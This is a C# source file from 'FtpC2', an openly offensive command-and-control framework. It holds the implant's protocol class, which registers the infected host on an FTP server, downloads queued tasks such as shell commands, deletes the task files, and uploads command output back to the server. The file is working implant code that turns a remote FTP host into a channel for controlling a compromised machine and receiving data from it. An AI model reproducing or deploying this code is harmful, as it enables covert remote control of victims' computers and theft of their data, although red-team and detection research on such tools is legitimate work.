/*
 * =========================================================================================
 * Author:        Jean-Pierre LESUEUR (@DarkCoderSc)
 * Email:         jplesueur@phrozen.io
 * Website:       https://www.phrozen.io
 * GitHub:        https://github.com/DarkCoderSc
 * Twitter:       https://twitter.com/DarkCoderSc
 * License:       Apache-2.0
 * =========================================================================================
 */

using FtpC2.Responses;
using FtpC2.Tasks;
using System.Text.Json;

namespace FtpAgent
{
    internal class AgentProtocol : ProtocolBase
    {
                
        public AgentProtocol(string host, string username, string password, bool secure, Guid agentSession)
            : base(host, username, password, secure, agentSession)
        { }

        public void RegisterOrUpdateAgent()
        {
            Agent agent = new();

            agent.Refresh(GetSession());

            string jsonAgent = JsonSerializer.Serialize(agent);

            UploadString(jsonAgent, Shared.PlaceHolders.AgentInformation);
        }

        public List<TaskWrapper> EnumerateTasks()
        {
            List<TaskWrapper> tasks = new();

            List<string> files = ListDirectory();

            string taskSessionCandidate = "";

            foreach (string file in files)
            {
                if (!file.StartsWith(Shared.PlaceHolders.TaskRequest))
                    continue;

                taskSessionCandidate = file.Substring(Shared.PlaceHolders.TaskRequest.Length + 1 /* +1 to ignore the dot */);                

                if (!Guid.TryParse(taskSessionCandidate, out Guid taskSession))
                    continue;                

                try
                {
                    // Download task content
                    string jsonData = DownloadString(file);

                    TaskWrapper? wrappedTask = JsonSerializer.Deserialize<TaskWrapper>(jsonData);
                    TaskWrapper? task = null;

                    if (wrappedTask != null && wrappedTask.Id == taskSession)
                    {
                        switch(wrappedTask.TaskType)
                        {
                            case "TaskShellCommand":
                            {
                                    TaskShellCommand? unwrappedTask = JsonSerializer.Deserialize<TaskShellCommand>(jsonData);
                                    if (unwrappedTask != null)
                                        task = unwrappedTask;

                                    break;
                            }

                            case "TaskCommand":
                                {
                                    TaskCommand? unwrappedTask = JsonSerializer.Deserialize<TaskCommand>(jsonData);
                                    if (unwrappedTask != null)
                                        task = unwrappedTask;

                                    break;
                                }

                            // Add your additional task classes here
                            // ...
                        }

                        if (task != null)
                            tasks.Add(task);
                    }                    
                }
                catch
                {
                    // Any potential exceptions are intentionally ignored to guarantee the deletion
                    // of the task file. This precautionary measure prevents the persistence of a
                    // possibly corrupted task file on the remote server, which could adversely affect
                    // operations.                    
                }

                try
                {
                    // Before registering the new task, it is mandatory to remove the existing
                    // task request file from the remote server. This prerequisite step 
                    // ensures smooth creation and operation of the new task.
                    DeleteFile(file);
                }
                catch
                {
                    continue;
                }                
            }           

            return tasks;
        }

        public void RegisterNewResponse(ResponseWrapper response, Guid taskId)
        {
            response.TaskId = taskId;
            response.AgentId = GetSession();
            response.DateTime = DateTime.Now;
            response.ResponseType = response.GetType().Name;

            string jsonData = JsonSerializer.Serialize(response, response.GetType());

            UploadString(jsonData, $"{Shared.PlaceHolders.ResponseRequest}.{taskId}");
        }

    }
}
